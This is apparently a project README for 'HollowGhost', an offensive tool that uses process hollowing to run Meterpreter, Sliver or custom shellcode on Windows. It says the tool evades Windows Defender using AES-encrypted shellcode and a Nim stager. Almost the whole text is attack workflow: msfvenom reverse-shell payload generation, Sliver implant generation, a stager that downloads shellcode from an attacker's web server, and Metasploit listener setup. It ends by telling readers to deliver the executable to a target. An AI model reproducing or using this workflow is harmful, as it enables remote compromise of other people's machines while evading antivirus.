# HollowGhost
Stealthy process hollowing tool for deploying Meterpreter, Sliver, or custom payloads. Dodges Windows Defender with AES‑encrypted shellcode and a silent Nim stager.

<p align="center">
  <img src="https://img.shields.io/badge/Developed%20on-Kali%20Linux-blueviolet" alt="Developed on Kali">
  <img src="https://img.shields.io/badge/Python-v3.8+-blue" alt="Python">
</p>

## Installation

To install and run this project:

```bash
  git clone https://github.com/Ares-21/HollowGhost.git
  cd HollowGhost
  ./install.sh
```
## Usage

**1. Generate the Shellcode**

Meterpreter (staged)
```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o staged.bin
```
Meterpreter (stageless)
```bash
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o stageless.bin
```
Sliver (process hollowing)
```bash
  sliver > generate --mtls <IP>:<PORT> --os windows --arch amd64 --format shellcode --skip-symbols --save sliver.bin
```
Sliver (staged Nim stager)
```bash
  sliver > generate --mtls <C2_IP>:<C2_PORT> --os windows --arch amd64 --format shellcode --skip-symbols --save shellc.bin
```
Then place .bin payload in a folder and start a web server on the port you’ll give to the tool:

**2. Execute HollowGhost.py after installation**

Interactive Mode
```bash
  ./run.sh
```
CLI commands
```bash
bash run.sh payload.bin --mode staged       # Meterpreter staged
bash run.sh payload.bin --mode stageless    # Meterpreter stageless
bash run.sh payload.bin --mode sliver       # Sliver process hollowing
bash run.sh payload.bin --mode generic      # Any raw shellcode
bash run.sh --mode sliver-staged --web-ip <WEB_IP> --web-port <WEB_PORT>   # Nim HTTP stager
```

**3. Host the File**
```bash
  python3 -m http.server <WEB_PORT>
```

**4. Set Up Listeners**

**Meterpreter:**
```bash
  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 4444; exploit"
```
For stageless, use windows/x64/meterpreter_reverse_tcp

**Sliver:**
```bash
  sliver > mtls --lport <PORT>
```

Deliver the generated .exe to the target – the session appears in seconds. Defender stays quiet.
